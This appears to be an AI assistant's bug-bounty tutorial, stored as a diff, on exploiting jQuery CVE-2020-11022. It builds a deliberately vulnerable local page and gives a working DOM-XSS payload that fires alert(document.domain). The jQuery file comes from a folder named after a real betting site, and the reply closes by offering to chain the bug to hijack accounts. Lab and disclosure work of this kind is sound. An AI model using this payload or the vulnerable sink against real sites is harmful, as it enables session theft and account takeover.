@@ -1,0 +1,85 @@
+To step through a manual browser inspection and exploit the CVE-2020-11022 vulnerability you just analyzed, we will simulate a realistic scenario. Imagine a target application with a hidden input field that reflects your text directly inside an outdated jQuery method. [1, 2] 
+## Phase 1: Local Environment Preparation
+Instead of risking blocks on real production portals, use the Python environment on your Ubuntu laptop to host a vulnerable mock application locally.
+
+   1. Create the target app directory:
+   
+   mkdir ~/bugbounty_lab && cd ~/bugbounty_lab
+   
+   2. Move your vulnerable jQuery file inside:
+   
+   mv ~/www.betpawa.cm/jquery-1.12.4.js .
+   
+   3. Build the vulnerable webpage: Open nano index.html and paste this block:
+   
+   <!DOCTYPE html>
+   <html>
+   <head>
+       <title>Bug Bounty Lab</title>
+       <script src="jquery-1.12.4.js"></script>
+   </head>
+   <body>
+       <h2>Vulnerable Search Dashboard</h2>
+       <div id="output-box"></div>
+   
+       <script>
+           // VULNERABILITY SINK: Reads raw text from URL hash parameter
+           var urlPayload = decodeURIComponent(window.location.hash.substring(1));
+           if(urlPayload) {
+               // The .html() method triggers the CVE-2020-11022 regex flaw
+               $("#output-box").html(urlPayload); 
+           }
+       </script>
+   </body>
+   </html>
+   
+   4. Boot up a local web server:
+   
+   python3 -m http.server 8080
+   
+   
+------------------------------
+## Phase 2: Live Browser Inspection Routine
+Open Google Chrome or Mozilla Firefox and navigate to http://localhost:8080.
+## 1. Activate the Inspector
+Right-click anywhere on the blank page surface and select Inspect, or press F12 on your keyboard to toggle the Developer Tools pane. [3, 4] 
+## 2. Audit the Dynamic Logic Paths
+Switch to the Sources tab (or Debugger tab in Firefox). Open index.html from the left directory tree. You will immediately trace how data flows into your DOM structure: [3] 
+
+* The Source: window.location.hash extracts strings directly from your browser search navigation URL.
+* The Sink: $("#output-box").html(...) accepts raw strings without filtering special characters or verifying encoding vectors. [1] 
+
+## 3. Inject the Payload
+Because jQuery version 1.12.4 relies on a flawed regular expression to handle internal markup generation, certain nested tags bypass parsing safety boundaries. Copy this standardized public exploit chain: [1, 5, 6] 
+
+<option><style></option></select><img src=x onerror=alert(document.domain)></style>
+
+Append this payload string to the URL inside your browser address path box: [5] 
+
+http://localhost:8080/#<option><style></option></select><img src=x onerror=alert(document.domain)></style>
+
+Press Enter to load the URL. [5] 
+## 4. Analyze the Execution Trap
+The browser immediately executes the code and throws a pop-up modal reading localhost, signaling successful DOM-Based Cross-Site Scripting (XSS)! [1, 2] 
+Switch back into your Elements tab inside your open DevTools suite. Expand the <div id="output-box"> node to see exactly how jQuery incorrectly restructured your string into executable code blocks: [1, 3] 
+
+<div id="output-box">
+   <option><style></option></select><img src="x" onerror="alert(document.domain)"></style>
+</div>
+
+------------------------------
+## Phase 3: Reporting to Bug Bounty Triage Teams
+When submitting this finding to a program platform (like [YesWeHack](https://www.yeswehack.com/)), follow these critical formatting tips to get your submission accepted: [7] 
+
+* Do not use alert(1) in production: Triagers often close reports with raw alert(1) popups as spam. Always leverage alert(document.domain) to definitively prove your payload has completely broken past the origin server sandboxes. [5] 
+* Provide clear impact scope: Explain that an attacker can chain this flaw to execute arbitrary commands, rewrite page DOM nodes dynamically to steal credentials, or hijack active user session cookies. [2, 5] 
+
+Would you like to analyze how to check for Server-Side Request Forgery (SSRF) bugs next, or do you want to learn how to chain this XSS bug to hijack account states?
+
+[1] [https://trustedsec.com](https://trustedsec.com/blog/everything-you-need-to-know-about-jquery-and-its-vulnerabilities)
+[2] [https://attaxion.com](https://attaxion.com/glossary/cwe-79-cross-site-scripting/)
+[3] [https://docs.apify.com](https://docs.apify.com/academy/scraping-basics-javascript/devtools-inspecting)
+[4] [https://helpdesk.cdmon.com](https://helpdesk.cdmon.com/portal/en/kb/articles/how-to-inspect-the-elements-of-a-website-in-different-browsers)
+[5] [https://hackerone.com](https://hackerone.com/reports/1812768)
+[6] [https://www.huntress.com](https://www.huntress.com/threat-library/vulnerabilities/cve-2020-11023)
+[7] [https://security.docs.wso2.com](https://security.docs.wso2.com/en/latest/security-reporting/reward-and-acknowledgement-program/)
